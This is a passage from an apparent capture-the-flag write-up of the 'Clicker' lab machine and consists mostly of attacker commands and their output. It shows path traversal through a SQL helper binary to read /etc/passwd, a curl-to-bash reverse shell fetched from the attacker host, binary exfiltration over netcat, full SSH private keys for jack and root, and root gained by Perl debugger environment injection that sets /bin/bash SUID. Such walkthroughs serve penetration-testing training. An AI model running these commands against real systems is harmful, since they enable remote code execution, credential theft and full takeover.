        VALUES ('admin', 'admin', 'ec9407f758dbed2ac510cac18f67056de100b1890f5bd8027ee496cc250e3f82', 'Admin', 999999999999999999, 999999999)
        ON DUPLICATE KEY UPDATE username=username
--------------
```

```c
www-data@clicker:/opt/manage$ ./execute_query 5 ../../../etc/passwd      
mysql: [Warning] Using a password on the command line interface can be insecure.
--------------
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
syslog:x:107:113::/home/syslog:/usr/sbin/nologin
uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:113:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
jack:x:1000:1000:jack:/home/jack:/bin/bash
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
mysql:x:114:120:MySQL Server,,,:/nonexistent:/bin/false
_rpc:x:115:65534::/run/rpcbind:/usr/sbin/nologin
statd:x:116:65534::/var/lib/nfs:/usr/sbin/nologin
_laurel:x:998:998::/var/log/laurel:/bin/false
--------------

ERROR 1064 (42000) at line 1: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
' at line 1

```

## Reversing the Binary

```c
www-data@clicker:/opt/manage$ nc 10.10.16.12 9002 < execute_query
```

```c
┌──(user㉿kali)-[/media/…/htb/machines/clicker/files]
└─$ nc -lnvp 9002 > execute_query
listening on [any] 9002 ...
connect to [10.10.16.12] from (UNKNOWN) [10.129.100.162] 40752
```

```c
                             s_ERROR:_not_enough_arguments_00102008          XREF[2]:     main:0010129e(*), 
                                                                                          main:001012a5(*)  
        00102008 45 52 52        ds         "ERROR: not enough arguments"
                 4f 52 3a 
                 20 6e 6f 
                             s_ERROR:_Invalid_arguments_00102024             XREF[2]:     main:0010132d(*), 
                                                                                          main:00101334(*)  
        00102024 45 52 52        ds         "ERROR: Invalid arguments"
                 4f 52 3a 
                 20 49 6e 
                             s_create.sql_0010203d                           XREF[2]:     main:00101356(*), 
                                                                                          main:0010135d(*)  
        0010203d 63 72 65        ds         "create.sql"
                 61 74 65 
                 2e 73 71 
                             s_populate.sql_00102048                         XREF[2]:     main:0010137d(*), 
                                                                                          main:00101384(*)  
        00102048 70 6f 70        ds         "populate.sql"
                 75 6c 61 
                 74 65 2e 
                             s_reset_password.sql_00102055                   XREF[2]:     main:001013a1(*), 
                                                                                          main:001013a8(*)  
        00102055 72 65 73        ds         "reset_password.sql"
                 65 74 5f 
                 70 61 73 
                             s_clean.sql_00102068                            XREF[2]:     main:001013c5(*), 
                                                                                          main:001013cc(*)  
        00102068 63 6c 65        ds         "clean.sql"
                 61 6e 2e 
                 73 71 6c 00

```

```c
www-data@clicker:/opt/manage$ echo 'system curl 10.10.16.12/jackshell|bash' > /tmp/shell
```

```c
www-data@clicker:/opt/manage$ ./execute_query 5 ../../../tmp/shell          
mysql: [Warning] Using a password on the command line interface can be insecure.
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100    47  100    47    0     0     86      0 --:--:-- --:--:-- --:--:--    86

```

```c
┌──(user㉿kali)-[~]
└─$ nc -lnvp 9002
listening on [any] 9002 ...
connect to [10.10.16.12] from (UNKNOWN) [10.129.100.162] 44684
jack@clicker:/opt/manage$
```

```c
jack@clicker:/home/jack/.ssh$ cat id_rsa
cat id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

```c
┌──(user㉿kali)-[/media/…/htb/machines/clicker/files]
└─$ cat jack_id_rsa 
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

```c
┌──(user㉿kali)-[/media/…/htb/machines/clicker/files]
└─$ chmod 600 jack_id_rsa
```

```c
┌──(user㉿kali)-[/media/…/htb/machines/clicker/files]
└─$ ssh -i jack_id_rsa jack@clicker.htb
The authenticity of host 'clicker.htb (10.129.100.162)' can't be established.
ED25519 key fingerprint is SHA256:OAOlD4te1rIAd/MBDNbXq9MuDWSFoc6Jc3eaBCC5u7o.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'clicker.htb' (ED25519) to the list of known hosts.
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-84-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat Sep 23 10:43:12 PM UTC 2023

  System load:           0.080078125
  Usage of /:            53.5% of 5.77GB
  Memory usage:          17%
  Swap usage:            0%
  Processes:             254
  Users logged in:       0
  IPv4 address for eth0: 10.129.100.162
  IPv6 address for eth0: dead:beef::250:56ff:feb0:5b15


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

jack@clicker:~$
```

## user.txt

```c
jack@clicker:~$ cat user.txt 
161e63dffbd3e641f3a9654e3eec71df
```

## Pivoting

```c
jack@clicker:~$ id
uid=1000(jack) gid=1000(jack) groups=1000(jack),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev)
```

```c
jack@clicker:~$ sudo -l
Matching Defaults entries for jack on clicker:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User jack may run the following commands on clicker:
    (ALL : ALL) ALL
    (root) SETENV: NOPASSWD: /opt/monitor.sh
```

```c
jack@clicker:~$ cat /opt/monitor.sh 
#!/bin/bash
if [ "$EUID" -ne 0 ]
  then echo "Error, please run as root"
  exit
fi

set PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
unset PERL5LIB;
unset PERLLIB;

data=$(/usr/bin/curl -s http://clicker.htb/diagnostic.php?token=secret_diagnostic_token);
/usr/bin/xml_pp <<< $data;
if [[ $NOSAVE == "true" ]]; then
    exit;
else
    timestamp=$(/usr/bin/date +%s)
    /usr/bin/echo $data > /root/diagnostic_files/diagnostic_${timestamp}.xml
fi
```

## Privilege Escalation to root

> https://www.elttam.com/blog/env/

```c
jack@clicker:~$ sudo PERL5OPT=-d PERL5DB='system("id");' /opt/monitor.sh
uid=0(root) gid=0(root) groups=0(root)
No DB::DB routine defined at /usr/bin/xml_pp line 9.
No DB::DB routine defined at /usr/lib/x86_64-linux-gnu/perl-base/File/Temp.pm line 870.
END failed--call queue aborted.
```

```c
jack@clicker:~$ sudo PERL5OPT=-d PERL5DB='system("chmod u+s /bin/bash");' /opt/monitor.sh
No DB::DB routine defined at /usr/bin/xml_pp line 9.
No DB::DB routine defined at /usr/lib/x86_64-linux-gnu/perl-base/File/Temp.pm line 870.
END failed--call queue aborted.
```

```c
jack@clicker:~$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1396520 Jan  6  2022 /bin/bash
```

## root.txt

```c
jack@clicker:~$ /bin/bash -p
bash-5.1# cat /root/root.txt
b02e4b129dea5f761bd3e7e19167c22b
```

## Closing

```c
bash-5.1# cat id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```
